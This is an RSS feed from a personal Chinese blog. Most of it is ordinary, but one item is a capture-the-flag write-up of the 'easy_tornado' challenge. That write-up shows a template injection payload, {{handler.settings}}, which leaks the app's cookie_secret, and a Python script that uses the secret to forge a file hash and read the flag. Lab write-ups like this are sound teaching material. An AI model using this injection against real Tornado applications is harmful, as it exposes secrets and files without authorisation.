<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>yym&#39;s blog</title>
    <link>http://yoursite.com/</link>
    
    <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
    
    <description>hello world</description>
    <pubDate>Wed, 06 May 2020 12:47:24 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>BUUCTF | [HCTF 2018]admin</title>
      <link>http://yoursite.com/undefined/[HCTF%202018]admin/</link>
      <guid>http://yoursite.com/undefined/[HCTF%202018]admin/</guid>
      <pubDate>Wed, 06 May 2020 12:56:40 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;BUUCTF-HCTF-2018-admin&quot;&gt;&lt;a href=&quot;#BUUCTF-HCTF-2018-admin&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF | [HCTF 2018]admin&quot;&gt;&lt;/a&gt;&lt;center&gt;BUUCTF | 
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="BUUCTF-HCTF-2018-admin"><a href="#BUUCTF-HCTF-2018-admin" class="headerlink" title="BUUCTF | [HCTF 2018]admin"></a><center>BUUCTF | [HCTF 2018]admin</center></h1>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/[HCTF%202018]admin/#disqus_thread</comments>
    </item>
    
    <item>
      <title>dockerfile创建数据卷</title>
      <link>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</link>
      <guid>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</guid>
      <pubDate>Wed, 06 May 2020 10:45:37 GMT</pubDate>
      <description>
      
      </description>
      
      
      <comments>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/#disqus_thread</comments>
    </item>
    
    <item>
      <title>2018护网杯(WEB)easy_tornado(模板注入)</title>
      <link>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</link>
      <guid>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</guid>
      <pubDate>Wed, 06 May 2020 10:45:37 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;考察知识点：模板注入&quot;&gt;&lt;a href=&quot;#考察知识点：模板注入&quot; class=&quot;headerlink&quot; title=&quot;考察知识点：模板注入&quot;&gt;&lt;/a&gt;&lt;center&gt;考察知识点：模板注入&lt;/center&gt;&lt;/h1&gt;&lt;p&gt;打开页面发现三个链接依次打开，发现各自的文
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src="https://i.imgur.com/zsu1I4d.png" alt="1"></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag in /fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(<span class="name">cookie_secret+md5</span>(<span class="name">filename</span>))</span><br></pre></td></tr></table></figure></div><p>从上面三个信息得知flag在/fllllllllllllag文件中<br>render这个卡住了看了WP 说render是模板注入<br>第三个文件说了文件名的哈希方法     </p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Tornado</span>是一种 <span class="selector-tag">Web</span> 服务器软件的开源版本。<span class="selector-tag">Tornado</span> 和现在的主流 <span class="selector-tag">Web</span> 服务器框架</span><br><span class="line">(包括大多数 Python 的框架)有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure></div><p>然后就是这段代码md5(cookie_secret+md5(filename)) 根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块 我们得想办法获得cookie_secret    </p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p>通过模板注入方式我们可以构造</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://de289baa-da8f<span class="string">-4380</span><span class="string">-954</span>c<span class="string">-4</span>b9c90a1ba95.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">//得到'cookie_secret': 'bf0b29ee<span class="string">-5520</span><span class="string">-4</span>b5b-a8a6-ffd19aa464f9'&#125;</span><br></pre></td></tr></table></figure></div><p><img src="https://i.imgur.com/FNG9lhZ.png" alt="2"><br>得到secret后，就是计算访问flag文件的hash，获取flag</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret="bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9"</span><br><span class="line">hash.<span class="keyword">update</span>(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.<span class="keyword">update</span>((cookie_secret+s1).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line">//hashlib.md5（）#获取一个md5加密算法对象</span><br><span class="line">//.hexdigest()返回摘要，作为十六进制数据字符串值</span><br><span class="line">//python3跟python2区别：python3下字符串为Unicode类型，而hash传递时需要的是utf<span class="number">-8</span>类型，因此，需要类型转换</span><br></pre></td></tr></table></figure></div><p>然后得到flag<br><img src="https://i.imgur.com/rJiBStL.png" alt=""></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">04</span>c40e94<span class="number">-4087</span><span class="number">-49e3</span><span class="number">-85</span>c6<span class="number">-74</span>a9472025c0&#125;</span><br></pre></td></tr></table></figure></div>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hello Zy</title>
      <link>http://yoursite.com/undefined/hello-world/</link>
      <guid>http://yoursite.com/undefined/hello-world/</guid>
      <pubDate>Thu, 30 Apr 2020 09:16:15 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;熬夜所以顺便多想你一会儿&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>熬夜所以顺便多想你一会儿</p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/hello-world/#disqus_thread</comments>
    </item>
    
    <item>
      <title>11.thinkphp5模型操作之删除数据</title>
      <link>http://yoursite.com/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</link>
      <guid>http://yoursite.com/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</guid>
      <pubDate>Sat, 25 Apr 2020 12:45:53 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;一丶模型操作之删除数据&quot;&gt;&lt;a href=&quot;#一丶模型操作之删除数据&quot; class=&quot;headerlink&quot; title=&quot;一丶模型操作之删除数据&quot;&gt;&lt;/a&gt;&lt;font color=red&gt;一丶模型操作之删除数据&lt;/font&gt;&lt;/h1&gt;&lt;h2 id=&quot;1丶删除当前
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::get(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;delete();</span><br></pre></td></tr></table></figure></div><h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User::destroy(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//支持删除多个数据</span></span><br><span class="line">User::destroy(<span class="string">'1,2,3'</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">User::destroy([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></div><h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除状态为0的数据</span></span><br><span class="line">User::destroy([<span class="string">'status'</span>=&gt;<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></div><p>或者通过数据库类的查询条件删除</p><pre><code>User::where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;delete();</code></pre>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
